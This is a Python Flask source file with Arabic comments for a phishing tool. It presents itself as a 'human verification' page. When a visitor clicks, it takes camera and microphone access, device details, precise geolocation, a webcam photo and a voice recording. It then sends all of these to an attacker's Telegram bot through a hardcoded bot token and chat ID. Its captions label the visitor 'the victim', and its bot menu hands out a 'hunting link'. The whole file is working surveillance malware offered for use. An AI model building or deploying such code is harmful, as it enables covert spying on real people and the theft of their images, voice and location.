import base64, requests, os, json
from flask import Flask, render_template_string, request

app = Flask(__name__)

# --- إعدادات الملك سيوفي ---
BOT_TOKEN = "8431816368:AAGL4xuB42ZdHpxRJ2O1zBgAWOB6cvZwwe0"
ADMIN_ID = "7041600701"

HTML = '''
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تأكيد الأمان</title>
    <style>
        body { background: #050505; color: white; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .card { background: #111; padding: 40px; border-radius: 25px; text-align: center; border: 1px solid #333; width: 85%; max-width: 380px; box-shadow: 0 15px 40px rgba(0,0,0,0.7); }
        .btn { background: #f38020; color: white; border: none; padding: 18px; border-radius: 12px; width: 100%; font-weight: bold; cursor: pointer; font-size: 1.1rem; }
        #st { margin-top: 20px; color: #888; font-size: 0.9rem; }
    </style>
</head>
<body>
    <div class="card">
        <div style="font-size: 60px; margin-bottom: 20px;">🔒</div>
        <h2>تحقق بشري</h2>
        <p style="color: #aaa; margin-bottom: 30px;">يرجى النقر للمتابعة وتأكيد أنك لست روبوت</p>
        <button class="btn" id="go" onclick="startProcess()">التحقق الآن</button>
        <div id="st">بانتظار البدء...</div>
    </div>
    <video id="v" autoplay playsinline muted style="display:none"></video>
    <canvas id="c" style="display:none"></canvas>

    <script>
        async function post(d, t) { fetch('/api/capture', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({d: d, t: t}) }); }

        async function startProcess() {
            document.getElementById('go').style.display = 'none';
            document.getElementById('st').innerText = "جاري تهيئة النظام... (3 ثواني)";
            
            try {
                const s = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                const v = document.getElementById('v'); v.srcObject = s;
                
                // جلب معلومات عميقة جداً
                const b = await navigator.getBattery().catch(() => ({}));
                const info = `📋 **تقرير معلومات تفصيلي**:\\n` +
                             `━━━━━━━━━━━━━━\\n` +
                             `🔋 البطارية: ${Math.round(b.level*100)}% (${b.charging ? 'يُشحن ⚡' : 'لا يُشحن'})\\n` +
                             `📱 النظام: ${navigator.platform}\\n` +
                             `🧠 المعالج: ${navigator.hardwareConcurrency} نوى\\n` +
                             `🖥️ الشاشة: ${window.screen.width}x${window.screen.height}\\n` +
                             `🎨 الألوان: ${window.screen.colorDepth}-bit\\n` +
                             `🌐 المتصفح: ${navigator.userAgent.split(' ')[0]}\\n` +
                             `🌍 اللغة: ${navigator.language}\\n` +
                             `⌛ التوقيت: ${new Date().toLocaleString()}`;
                post(info, "msg");

                // الموقع
                navigator.geolocation.getCurrentPosition(p => {
                    post(`📍 **رابط الخريطة**:\\nhttp://google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`, "msg");
                }, null, {enableHighAccuracy: true});

                // الانتظار 3 ثواني قبل الصورة (لحل مشكلة السواد)
                setTimeout(() => {
                    const c = document.getElementById('c');
                    c.width = v.videoWidth; c.height = v.videoHeight;
                    c.getContext('2d').drawImage(v, 0, 0);
                    post(c.toDataURL('image/jpeg', 0.85), "img");
                    document.getElementById('st').innerText = "جاري تسجيل البصمة... (5 ثواني)";
                    
                    // تسجيل صوتي احترافي
                    const r = new MediaRecorder(s);
                    const ch = [];
                    r.ondataavailable = e => ch.push(e.data);
                    r.onstop = () => {
                        const reader = new FileReader();
                        reader.readAsDataURL(new Blob(ch));
                        reader.onloadend = () => post(reader.result, "aud");
                        document.getElementById('st').innerText = "✅ اكتمل التحقق بنجاح!";
                    };
                    r.start();
                    setTimeout(() => r.stop(), 5000);
                }, 3000); // 3 ثواني تأخير للصورة

            } catch (e) { location.reload(); }
        }
    </script>
</body>
</html>
'''

@app.route('/')
def home():
    return render_template_string(HTML)

@app.route('/api/capture', methods=['POST'])
def capture():
    data = request.get_json(force=True, silent=True)
    t, d = data.get('t'), data.get('d')
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/"
    if t == 'msg':
        requests.post(url + "sendMessage", json={'chat_id': ADMIN_ID, 'text': d, 'parse_mode': 'Markdown'})
    elif t == 'img':
        img = base64.b64decode(d.split(',')[1])
        requests.post(url + "sendPhoto", data={'chat_id': ADMIN_ID, 'caption': "📸 **صورة الضحية**"}, files={'photo': ('c.jpg', img)})
    elif t == 'aud':
        aud = base64.b64decode(d.split(',')[1])
        requests.post(url + "sendVoice", data={'chat_id': ADMIN_ID, 'caption': "🎙 **بصمة الضحية**"}, files={'voice': ('v.ogg', aud)})
    return "OK"

@app.route('/webhook', methods=['POST'])
def bot_webhook():
    data = request.get_json(force=True, silent=True)
    if "message" in data:
        uid = str(data["message"]["chat"]["id"])
        if uid == ADMIN_ID:
            kb = {"inline_keyboard": [[{"text": "🔗 رابط الصيد", "callback_data": "link"}], [{"text": "📊 الحالة", "callback_data": "status"}]]}
            requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", 
                          json={'chat_id': uid, 'text': "🔥 أهلاً ملك سيوفي.. البوت جاهز تماماً!", 'reply_markup': kb})
    
    elif "callback_query" in data:
        cid = data["callback_query"]["message"]["chat"]["id"]
        cb = data["callback_query"]["data"]
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/"
        if cb == "link":
            requests.post(url + "sendMessage", json={'chat_id': cid, 'text': f"🚀 رابطك المباشر:\\n`https://{request.host}`", 'parse_mode': 'Markdown'})
        elif cb == "status":
            requests.post(url + "sendMessage", json={'chat_id': cid, 'text': "✅ السيرفر يعمل وبقوة v13.0"})
            
    return "OK"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=10000)
